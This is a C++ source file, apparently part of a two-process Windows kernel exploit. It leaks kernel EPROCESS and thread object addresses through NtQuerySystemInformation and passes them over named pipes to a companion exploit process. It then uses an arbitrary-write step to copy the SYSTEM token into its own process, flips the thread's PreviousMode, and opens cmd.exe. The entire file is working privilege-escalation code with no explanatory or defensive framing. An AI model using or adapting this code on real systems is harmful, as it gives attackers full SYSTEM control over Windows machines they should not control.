// NtQuerySysInfo_SystemModuleInformation.cpp : Attempts to use the NtQuerySystemInformation to find the base addresses if loaded modules.
//
#include <iostream>
#include <windows.h>
#pragma comment (lib, "ntdll")

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define err_exit(msg) \
    do { \
       printf("[x] %s in %s: %d\n", msg, FILENAME(__FILE__), __LINE__); \
	   exit(-1); \
    } while (0)


#define FILENAME(file) (strrchr(file, '\\') ? strrchr(file, '\\') + 1 : file)

#define info(fmt, ...) \
    do { \
            printf(fmt"  [%s: %d]\n", ##__VA_ARGS__, FILENAME(__FILE__), __LINE__); \
    } while (0)

void binary_dump(const char *desc, void *addr, int len) {
	uint64_t *buf64 = (uint64_t *)addr;
	uint8_t *buf8 = (uint8_t *)addr;
	if (desc != NULL) {
		printf("[*] %s:\n", desc);
	}
	for (int i = 0; i < len / 8; i += 4) {
		printf("  %04x", i * 8);
		for (int j = 0; j < 4; j++) {
			i + j < len / 8 ? printf(" 0x%016llx", buf64[i + j]) : printf("                   ");
		}
		printf("   ");
		for (int j = 0; j < 32 && j + i * 8 < len; j++) {
			printf("%c", isprint(buf8[i * 8 + j]) ? buf8[i * 8 + j] : '.');
		}
		puts("");
	}
}

#define MAXIMUM_FILENAME_LENGTH 255 

typedef struct _SYSTEM_HANDLE
{
	PVOID Object;
	HANDLE UniqueProcessId;
	HANDLE HandleValue;
	ULONG GrantedAccess;
	USHORT CreatorBackTraceIndex;
	USHORT ObjectTypeIndex;
	ULONG HandleAttributes;
	ULONG Reserved;
} SYSTEM_HANDLE, *PSYSTEM_HANDLE;

typedef struct __SYSTEM_HANDLE_INFORMATION_EX
{
	ULONG_PTR HandleCount;
	ULONG_PTR Reserved;
	SYSTEM_HANDLE Handles[1];
} SYSTEM_HANDLE_INFORMATION_EX, *PSYSTEM_HANDLE_INFORMATION_EX;

typedef enum __SYSTEM_INFORMATION_CLASS {
	SystemExtendedHandleInformation = 64
} SYSTEM_INFORMATION_CLASS_EX;

typedef NTSTATUS(WINAPI *PNtQuerySystemInformation)(
	__in SYSTEM_INFORMATION_CLASS_EX SystemInformationClass,
	__inout PVOID SystemInformation,
	__in ULONG SystemInformationLength,
	__out_opt PULONG ReturnLength
	);

uint64_t sysProc;
uint64_t curProc;
uint64_t curThread;
int getObject(uint64_t *pAddress, uint32_t Pid, uint64_t Handle)
{
	HMODULE ntdll = GetModuleHandle(TEXT("ntdll"));
	PNtQuerySystemInformation query = (PNtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
	if (query == NULL) {
		err_exit("GetProcAddress() failed");
	}
	ULONG len = 20;
	NTSTATUS status = (NTSTATUS)0xc0000004;
	PSYSTEM_HANDLE_INFORMATION_EX pHandleInfo = NULL;
	do {
		len *= 2;
		pHandleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)GlobalAlloc(GMEM_ZEROINIT, len);
		status = query(SystemExtendedHandleInformation, pHandleInfo, len, &len);

	} while (status == (NTSTATUS)0xc0000004);

	if (status != (NTSTATUS)0x0) {
		err_exit("NtQuerySystemInformation failed");
	}
	for (int i = 0; i < pHandleInfo->HandleCount; i++) {
		PVOID object = pHandleInfo->Handles[i].Object;
		HANDLE handle = pHandleInfo->Handles[i].HandleValue;
		HANDLE pid = pHandleInfo->Handles[i].UniqueProcessId;
		if (pid == (HANDLE)Pid && handle == (HANDLE)Handle) {
			*pAddress = (uint64_t)object;
			printf("[+] PID: %d\t", pid);
			printf("Object: %#llx\t", object);
			printf("Handle: %#x\r\n", handle);
			break;
		}
	}
	return 0;
}

typedef struct {
	HANDLE r;
	HANDLE w;
} PIPE_HANDLES;

struct Address {
	uint64_t sysProc;
	uint64_t curProc;
	uint64_t curThread;
};
struct Address address;

HANDLE hPipe = INVALID_HANDLE_VALUE;
HANDLE hPipe0 = INVALID_HANDLE_VALUE;

void init() {
	info("[+] Leak Kenrel Object Address in x64");
	hPipe = CreateNamedPipe(
		L"\\\\.\\pipe\\addressPipe",
		PIPE_ACCESS_DUPLEX,
		PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
		1,
		4096, 4096,
		NMPWAIT_WAIT_FOREVER, 0);

	if (hPipe == INVALID_HANDLE_VALUE) {
		err_exit("Failed to create leak-exp NamedPipe");
	}

	hPipe0 = CreateFile(L"\\\\.\\pipe\\NamedPipe0", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

	if (hPipe0 == INVALID_HANDLE_VALUE) {
		CloseHandle(hPipe);
		err_exit("Failed to connect pwn-leak NamedPipe");
	}

	HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION, TRUE, GetCurrentThreadId());
	HANDLE hCurProc = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, GetCurrentProcessId());
	getObject(&sysProc, 4, 4);
	getObject(&curProc, GetCurrentProcessId(), (uint64_t)hCurProc);
	getObject(&curThread, GetCurrentProcessId(), (uint64_t)hThread);

	address.sysProc = sysProc;
	address.curProc = curProc;
	address.curThread = curThread;
}

void sendAddressToExp() {
	DWORD retVal = 0;
	UCHAR x = 'X';
	info("[+] Tell pwn process to start exp process");
	if (!WriteFile(hPipe0, &x, sizeof(x), &retVal, 0)) {
		err_exit("Failed to WriteFile to start exp process");
	}

	info("[+] Send some kernel addresses to Exp process");
	if (!ConnectNamedPipe(hPipe, NULL) && GetLastError() != ERROR_PIPE_CONNECTED) {
		err_exit("Failed to connect leak-exp NamedPipe");
	}

	if (!WriteFile(hPipe, &address, sizeof(address), &retVal, 0)) {
		err_exit("Failed to WriteFile");
	}
}

void arb_write(void* dst, void* src, size_t size) {
	typedef NTSTATUS(WINAPI* NtWriteVirtualMemory_t) (
		_In_ HANDLE ProcessHandle,
		_In_ PVOID BaseAddress,
		_In_ PVOID Buffer,
		_In_ ULONG NumberOfBytesToWrite,
		_Out_opt_ PULONG NumberOfBytesWritten
	);

	NTSTATUS status = 0;
	DWORD res = 0;

	HMODULE hntdll = LoadLibrary(L"ntdll.dll");
	if (hntdll == NULL) {
		err_exit("Failed to load ntdll.dll");
	}

	NtWriteVirtualMemory_t NtWriteVirtualMemory = (NtWriteVirtualMemory_t)GetProcAddress(hntdll, "NtWriteVirtualMemory");
	if (NtWriteVirtualMemory == NULL) {
		err_exit("Failed to get NtWriteVirtualMemory function address");
	}

	status = NtWriteVirtualMemory(GetCurrentProcess(), dst, src, 8, &res);
	if (!NT_SUCCESS(status)) {
		err_exit("Failed to arb write");
	}
}

void Escalate() {
	UINT64 mode = 1;
	UINT64 token = 0;
	arb_write((void*)&token, (void*)(address.sysProc + 0x4b8), 8);
	arb_write((void*)(address.curProc + 0x4b8), (void*)&token, 8);
	arb_write((void*)(address.curThread + 0x232), (void*)&mode, 1);
	printf("[+] Leak system token: %llx in leak process\n", token);
}

void waitForExp() {
	info("[+] Wait for Exp process");
	DWORD retVal;
	UCHAR x;
	if (!ReadFile(hPipe, &x, sizeof(x), &retVal, 0) || retVal <= 0) {
		err_exit("Failed to wait for exp process");
	}

	Sleep(1000);
	if (x == 'X') {
		info("[+] Let's try to pwn it!");
		Escalate();
	}
}

void closePipe() {
	DisconnectNamedPipe(hPipe);
	CloseHandle(hPipe);
}

static void cmd() {
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
	BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE,
		CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
	if (bReturn)
		CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
}

int main()
{
	init();
	sendAddressToExp();
	waitForExp();
	closePipe();
	info("[+] Leak Process END!");
	Sleep(1000);
	cmd();
//	system("cmd.exe");
//	system("pause");
//	while (1) {
//		Sleep(1000);
//	}
	return 0;
}
